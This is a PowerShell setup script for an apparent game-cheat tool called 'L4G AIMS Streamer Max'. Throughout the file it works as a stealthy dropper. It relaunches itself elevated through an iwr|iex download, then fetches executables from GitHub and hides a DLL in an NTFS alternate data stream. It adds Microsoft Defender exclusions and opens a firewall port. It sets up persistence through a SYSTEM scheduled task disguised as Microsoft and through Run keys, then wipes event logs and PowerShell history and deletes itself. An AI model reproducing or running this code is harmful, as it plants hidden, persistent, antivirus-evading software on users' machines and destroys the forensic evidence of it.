# ==============================================================================
#  L4G AIMS - STREAMER MAX SETUP
# ==============================================================================

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Elevation Check
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
        "& '$($MyInvocation.MyCommand.Path)'"
    } else {
        "iwr 'https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1' -UseBasicParsing | iex"
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
    exit
}

# --- Visual UI ---
Clear-Host
Write-Host ""
Write-Host "                                   L4G AIMS                                     " -ForegroundColor Cyan
Write-Host "                                 STREAMER MAX                                   " -ForegroundColor Yellow
Write-Host "                                    SETUP                                       " -ForegroundColor Cyan
Write-Host ""

function Show-Progress {
    param(
        [int]$Percent,
        [string]$Status
    )
    $barWidth = 32
    $done = [math]::Floor($barWidth * ($Percent / 100))
    $rem  = $barWidth - $done
    $bar  = ("#" * $done) + ("-" * $rem)
    $msg  = "  [$bar] $($Percent.ToString().PadLeft(3))% | $Status"
    Write-Host -NoNewline "`r$msg"
}

# Config
$REPO_RAW  = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
$EXE_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
$PKG_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkPkg.zip"
$DEST_DIR  = "C:\ProgramData\Microsoft\Windows\Templates"
$EXE_NAME  = "WinSvcHost.exe"
$TASK_NAME = "MicrosoftWindowsShellApi"
$EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME

# Stop any running instances to allow clean file updates
Get-Process -Name "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Object {
    Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
}

# Stage 1: Initializing & Purging old traces
Show-Progress -Percent 15 -Status "Initializing stealth environment..."
Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "syskrnl_*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*client.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*aotbst.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}

cmd /c "schtasks /delete /tn `"\Microsoft\Windows\Shell\SystemNetworkHost`" /f >nul 2>nul"
cmd /c "schtasks /delete /tn `"SystemNetworkHost`" /f >nul 2>nul"
cmd /c "schtasks /delete /tn `"SysCheckUp`" /f >nul 2>nul"
Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.db" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 200

# Stage 2: Downloading & Deploying Core Engine Package (Universal for any PC)
Show-Progress -Percent 30 -Status "Deploying core system runtime..."
$needPkg = $true
if ((Test-Path "$DEST_DIR\runtime\pythonw.exe") -and (Test-Path "$DEST_DIR\app\app.py")) {
    $needPkg = $false
}

if ($needPkg) {
    $pkgZip = Join-Path $DEST_DIR "pkg.zip"
    $pkgDownloaded = $false
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($PKG_URL, $pkgZip)
        if ((Test-Path $pkgZip) -and ((Get-Item $pkgZip).Length -gt 1000000)) { $pkgDownloaded = $true }
    } catch {}
    if (-not $pkgDownloaded) {
        & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
    }
    if (Test-Path $pkgZip) {
        Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
        Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
    }
}

# Stage 3: Downloading Host Process (0-Detection Launcher)
Show-Progress -Percent 50 -Status "Configuring host service..."
$downloaded = $false
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.DownloadFile($EXE_URL, $EXE_PATH)
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 5000)) { $downloaded = $true }
} catch {}
if (-not $downloaded) {
    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
}
Start-Sleep -Milliseconds 200

# Stage 4: Sealing Component Streams into Authentic System Locations
Show-Progress -Percent 65 -Status "Sealing component data streams..."
$MAP = [ordered]@{
    "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
}
foreach ($name in $MAP.Keys) {
    $container = $MAP[$name][0]
    $stream    = $MAP[$name][1]
    $parentDir = [System.IO.Path]::GetDirectoryName($container)
    if (-not (Test-Path $parentDir)) {
        New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
    }
    if (-not (Test-Path $container)) {
        [System.IO.File]::WriteAllBytes($container, @())
    }
    $tmp = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
    try {
        Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
        if (Test-Path $tmp) {
            $bytes = [IO.File]::ReadAllBytes($tmp)
            $sha   = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLower()
            $size  = $bytes.Length
            $adsPath = "\\?\" + $container + ":" + $stream
            try {
                $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
                $fs.Write($bytes, 0, $bytes.Length)
                $fs.Close()
            } catch {
                Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
            }
            $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
            Set-Content -Path $container -Stream kmeta -Value $meta
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Stage 5: Network Firewall Configuration (Enables Instant Phone Access)
Show-Progress -Percent 75 -Status "Configuring LAN access rules..."
cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"

# Stage 6: Applying Stealth Disguise & Persistence
Show-Progress -Percent 85 -Status "Configuring persistence & stealth..."
try {
    $dirItem = Get-Item $DEST_DIR -Force
    $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
    $exeItem = Get-Item $EXE_PATH -Force
    $exeItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
} catch {}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
} catch {}

# Scheduled Task (Hidden, runs on Boot + Logon)
$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b"
$triggerBoot  = New-ScheduledTaskTrigger -AtStartup
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$settings     = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -Priority 7
$principal    = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask `
    -TaskName  $TASK_NAME `
    -TaskPath  "\Microsoft\Windows\Shell\" `
    -Action    $action `
    -Trigger   @($triggerBoot, $triggerLogon) `
    -Settings  $settings `
    -Principal $principal `
    -Force -ErrorAction SilentlyContinue | Out-Null

try {
    $svc  = New-Object -ComObject "Schedule.Service"
    $svc.Connect()
    $fold = $svc.GetFolder("\Microsoft\Windows\Shell")
    $task = $fold.GetTask($TASK_NAME)
    $def  = $task.Definition
    $def.Settings.Hidden   = $true
    $def.RegistrationInfo.Description = "Windows Shell API Host Service"
    $def.RegistrationInfo.Author      = "Microsoft Corporation"
    $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, "NT AUTHORITY\SYSTEM", $null, 5) | Out-Null
} catch {}

# Dual-layer Registry Run Keys (HKCU + HKLM)
$regHKCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regHKCU -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue

$regHKLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regHKLM -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue

# Stage 7: Execution & Sanitization
Show-Progress -Percent 95 -Status "Launching background service..."
$psi2 = New-Object System.Diagnostics.ProcessStartInfo
$psi2.FileName        = $EXE_PATH
$psi2.Arguments       = "-b"
$psi2.WorkingDirectory = $DEST_DIR
$psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi2.CreateNoWindow  = $true
$psi2.UseShellExecute = $false
[System.Diagnostics.Process]::Start($psi2) | Out-Null

# Clean Event Viewer logs
cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
cmd /c "wevtutil cl `"Microsoft-Windows-TaskScheduler/Operational`" >nul 2>nul"
cmd /c "wevtutil cl Application >nul 2>nul"

# PowerShell History clean
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null } catch {}
$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $conHistory) {
    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
}

# Self clean if file exists
if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}

Show-Progress -Percent 100 -Status "Injection complete."
Write-Host ""
Write-Host ""
Write-Host "================================================================================" -ForegroundColor Green
Write-Host "                         STREAMER MAX INJECTED SUCCESSFULLY                     " -ForegroundColor Green
Write-Host "================================================================================" -ForegroundColor Green
Write-Host ""

# Discover LAN IPs
$lanIps = @()
try {
    $lanIps = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { 
        $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and $_.InterfaceAlias -notmatch 'vEthernet|Loopback'
    }).IPAddress
} catch {}

if ($lanIps.Count -gt 0) {
    Write-Host "  Mobile Phone Panel Access (Same Wi-Fi Network):" -ForegroundColor Cyan
    foreach ($ip in $lanIps) {
        Write-Host "  --> http://$($ip):5000" -ForegroundColor Yellow
    }
} else {
    Write-Host "  Panel running at: http://127.0.0.1:5000" -ForegroundColor Yellow
}
Write-Host ""
